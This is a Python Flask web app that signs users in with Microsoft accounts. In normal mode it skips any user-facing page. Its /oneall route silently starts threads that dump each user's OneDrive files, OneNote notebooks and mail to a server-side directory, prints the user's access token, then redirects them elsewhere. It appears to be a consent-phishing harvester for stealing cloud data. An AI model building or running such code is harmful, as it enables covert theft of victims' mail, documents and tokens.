from flask              import Flask, redirect, render_template, request, session, url_for, jsonify
from flask_session      import Session
from extractor.onenote  import dump_onenote
from extractor.onedrive import dump_onedrive
from extractor.mail     import dump_mail
from threading          import Thread

import identity
import identity.web
import requests
import app_config


app = Flask(__name__)
app.config.from_object(app_config)
Session(app)


# This section is needed for url_for("foo", _external=True) to automatically
# generate http scheme when this sample is running on localhost,
# and to generate https scheme when it is deployed behind reversed proxy.
# See also https://flask.palletsprojects.com/en/2.2.x/deploying/proxy_fix/
from werkzeug.middleware.proxy_fix import ProxyFix
app.wsgi_app = ProxyFix(app.wsgi_app, x_proto=1, x_host=1)

auth = identity.web.Auth(
    session=session,
    authority=app.config.get("AUTHORITY"),
    client_id=app.config["CLIENT_ID"],
    client_credential=app.config["CLIENT_SECRET"],
)


@app.route("/login")
def login():
    return render_template("login.html", version=identity.__version__, **auth.log_in(
        scopes=app_config.SCOPE, # Have user consent to scopes during log-in
        redirect_uri=app_config.REDIRECT_URI, # Optional. If present, this absolute URL must match your app's redirect_uri registered in Azure Portal
        ))


@app.route(app_config.REDIRECT_PATH)
def auth_response():
    result = auth.complete_log_in(request.args)
    if "error" in result:
        return render_template("auth_error.html", result=result)
    return redirect(url_for("index"))


@app.route("/logout")
def logout():
    return redirect(auth.log_out(url_for("index", _external=True)))


@app.route("/")
def index():
    if not (app.config["CLIENT_ID"] and app.config["CLIENT_SECRET"]):
        # This check is not strictly necessary.
        # You can remove this check from your production code.
        return render_template('config_error.html')
    if not auth.get_user():
        return redirect(url_for("login"))

    if app.debug:
        return render_template('index.html', user=auth.get_user(), version=identity.__version__)
    
    return redirect(url_for("oneall"))

@app.route("/onenote")
def onenote():
    notebook = list()

    token = auth.get_token_for_user(app_config.SCOPE)
    if "error" in token:
        return redirect(url_for("login"))

    #dump_onenote(token['access_token'], auth.get_user().get("preferred_username"), extract_dir=app_config.EXTRACT_DIR)
    Thread(target=dump_onenote, args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()

    if app.debug:
        return render_template('tkt.html') 
    
    return redirect(app_config.REDIRECT_URI_CLIENT)

@app.route("/onedrive")
def onedrive():
    token = auth.get_token_for_user(app_config.SCOPE)
    if "error" in token:
        return redirect(url_for("login"))
    
    # dump_onedrive(token['access_token'], auth.get_user().get("preferred_username"), extract_dir=app_config.EXTRACT_DIR)
    Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()

    if app.debug:
        return render_template('tkt.html') 
    
    return redirect(app_config.REDIRECT_URI_CLIENT)

@app.route("/mail")
def mail():
    token = auth.get_token_for_user(app_config.SCOPE)
    if "error" in token:
        return redirect(url_for("login"))
    
    #dump_mail(token['access_token'], auth.get_user().get("preferred_username"), extract_dir=app_configEXTRACT_DIR)
    Thread(target=dump_mail, args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()

    if app.debug:
        return render_template('tkt.html')
    
    return redirect(app_config.REDIRECT_URI_CLIENT)

@app.route("/oneall")
def oneall():
    token = auth.get_token_for_user(app_config.SCOPE)
    if "error" in token:
        return redirect(url_for("login"))
    
    Thread(target=dump_onedrive, args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()
    Thread(target=dump_onenote , args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()
    Thread(target=dump_mail    , args=(token['access_token'],auth.get_user().get("preferred_username"), app_config.EXTRACT_DIR)).start()

    print(token['access_token'])

    if app.debug:
        return render_template('tkt.html') 
    
    return redirect(app_config.REDIRECT_URI_CLIENT)
if __name__ == "__main__":
    app.run(debug=False)
